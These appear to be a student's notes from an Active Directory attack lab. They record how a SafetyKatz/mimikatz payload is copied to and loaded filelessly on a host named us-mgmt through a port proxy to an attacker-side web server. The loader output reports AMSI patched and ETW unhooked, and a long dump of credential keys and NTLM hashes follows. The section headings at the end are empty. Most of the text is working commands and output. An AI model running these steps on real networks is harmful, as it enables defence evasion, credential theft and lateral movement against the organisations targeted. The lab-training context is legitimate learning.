# HANDS-ON 13:

```

- Find a computer object in US domain where we have Write permissions.
- Abuse the Write permissions to access that computer as Domain Admin.
- Extract secrets from that machine for users and hunt for local admin privileges for the users.

```


## Index of content

  1. [Write Permissions](#find-computer)
  2. [Abuse Permissions](#abuse-permissions)
  3. [Extract Secrets](#extract-secrets)

Extract credentials from us-mgmt machine:

copy Loader.ex fromm attacker machine to target machine:
```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
Does \\us-mgmt\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied

```
Access to target machine us-mgmt:
```
C:\Windows\system32>winrs -r:us-mgmt cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.
```

create port proxy:
```
C:\Users\studentuser17>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.17
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.17

```

webserver on the attacker machine side:
```
C:\AD\Tools>python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.1.31 - - [20/Feb/2023 11:14:06] "GET /SafetyKatz.exe HTTP/1.1" 200 -
```
Load fileless Safetykatz from the attacker machine:

```
C:\Users\studentuser17>C:\Users\Public\Loader.exe -path  http://127.0.0.1:8080/SafetyKatz.exe
C:\Users\Public\Loader.exe -path  http://127.0.0.1:8080/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
```
Dump credentials:
```
mimikatz # sekurlsa::keys

Authentication Id : 0 ; 1757682 (00000000:001ad1f2)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:49 AM
SID               : S-1-5-90-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 1752836 (00000000:001abf04)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:49 AM
SID               : S-1-5-96-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 49528 (00000000:0000c178)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:02 AM
SID               : S-1-5-90-0-1

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 29411 (00000000:000072e3)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:01 AM
SID               : S-1-5-96-0-1

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 49593 (00000000:0000c1b9)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:02 AM
SID               : S-1-5-90-0-1

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 29447 (00000000:00007307)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:01 AM
SID               : S-1-5-96-0-0

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-MGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:01 AM
SID               : S-1-5-18

         * Username : us-mgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 1941534 (00000000:001da01e)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:22:24 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115

         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
           rc4_hmac_nt       e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old      e53153fc2dc8d4c5a5839e46220717e5
           rc4_md4           e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_nt_exp   e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old_exp  e53153fc2dc8d4c5a5839e46220717e5

Authentication Id : 0 ; 1941475 (00000000:001d9fe3)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:22:24 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115

         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
           rc4_hmac_nt       e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old      e53153fc2dc8d4c5a5839e46220717e5
           rc4_md4           e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_nt_exp   e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old_exp  e53153fc2dc8d4c5a5839e46220717e5

Authentication Id : 0 ; 1757636 (00000000:001ad1c4)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:49 AM
SID               : S-1-5-90-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-MGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:02 AM
SID               : S-1-5-20

         * Username : us-mgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

mimikatz #

```
## Write Permissions

## Abuse Permissions

## Extract Secrets
